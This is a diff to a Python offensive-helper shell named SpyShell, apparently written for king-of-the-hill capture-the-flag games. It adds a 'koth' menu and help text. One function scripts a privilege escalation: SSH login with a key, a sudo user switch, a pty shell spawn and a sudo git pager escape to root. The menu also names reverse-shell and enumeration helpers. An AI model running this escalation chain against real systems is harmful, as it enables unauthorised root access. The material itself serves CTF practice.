@@ -48,13 +48,13 @@ def runCommand(cmd):
         which_distro()
     elif args[0] == 'revenger':
         revenger()
-    elif args[0] == 'grabip':
+    elif args[0] == 'grabIp' or args[0] == 'grabip':
         grabip()
     elif args[0] == 'splitV':
         split_v()
     elif args[0] == 'splitH':
         split_h()
-    elif args[0] == 'defaultTheme':
+    elif args[0] == 'defaultTheme' or args[0] == 'tmux':
         new_session()
     elif args[0] == 'ohshit':
         domenum()
@@ -66,14 +66,16 @@ def runCommand(cmd):
         reverse_shell()
     elif args[0] == 'wordGen':
         generateList()
+    elif args[0] == 'koth':
+        koth()
+    elif args[0] == 'portcheck' or args[0] == 'portCheck':
+        host = 'localhost'
+        port = int(input("[ENTER THE PORT NUMBER TO CHECK]: "))
+        portcheck(host,port)
     elif args[0].lower() in ['helpme', 'help-me', 'help me', 'help']:
         help()
     #koth fun
-    elif args[0] == 'ashu@production':
-        ashu_at_production()
-    elif args[0] == 'donkey@shrek':
-        donkey_at_shrek()
-    elif args[0] == 'fileinfo':
+    elif args[0] == 'fileInfo' or args[0] == 'fileInfo':
         if len(args) > 1:
             fileinfo(args[1])
         else:
@@ -94,6 +96,30 @@ def runCommand(cmd):
         except subprocess.CalledProcessError as ex:
             print(f"{red}Command '{cmd}' failed with exit code {ex.returncode}.{nc}")
 
+def help():
+    print("""SpyShell's Commands are listed below : 
+            1. heyListen
+            2. webAnalyzer
+            3. stegoscanner
+            4. revenger
+            5. helloFriend
+            6. help me
+            7. ohshit (domain enumeration from online sources)
+            8. fileInfo
+            9. grabIp
+            10. wordGen 
+            11. koth
+            more are in progress
+            """)
+
+def koth():
+    inp = input("[WHICH MACHINE TO PWN]: ")
+    if inp == "production":
+        ashu_at_production()
+    elif inp == "shrek":
+        donkey_at_shrek()
+    else :
+        print("[BYE BYE!] ;-)")
 
 def hello_friend():
     print("enter the path of file : ")
@@ -105,18 +131,21 @@ def hello_friend():
         print("Hey! the file you're trying to use doesn't exist.")
 
 def ashu_at_production():
-    command = """
-            echo "enter the machine IP :\n"
-            read IP
-            ssh -t -i prossh ashu@$IP << EOF
-            sudo su skidy
-            python -c "import pty;pty.spawn('/bin/bash')"
-            whoami
-            sudo git branch --help config << EOF1
-            whoami
-            EOF1
-            EOF"""
-    subprocess.run(command, shell=True)
+    try:
+        command = """
+                echo "enter the machine IP :\n"
+                read IP
+                ssh -t -i prossh ashu@$IP << EOF
+                sudo su skidy
+                python -c "import pty;pty.spawn('/bin/bash')"
+                whoami
+                sudo git branch --help config << EOF1
+                whoami
+                EOF1
+                EOF"""
+        subprocess.run(command, shell=True)
+    except Exception as exp:
+        print(f"Exception occurred : {exp}")
 
 def donkey_at_shrek():
     ip = input("enter the ip address for shrek: ")
@@ -188,26 +217,6 @@ def web_analyzer():
                 analyze_link(link)
             else:
                 print("[ERROR OCCURRED]")
-
-
-    
-def help():
-    print("""SpyShell's Commands are listed below : 
-            1. heyListen
-            2. webAnalyzer
-            3. stegoscanner
-            4. revenger
-            5. helloFriend
-            6. help me
-            7. ohshit
-            8. splitV
-            9. splitH
-            10. defaultTheme
-            11. fileinfo
-            12. grabip
-            13. 
-            more are in progress
-            """)
 
 def handle_connection(conn):
     while True:
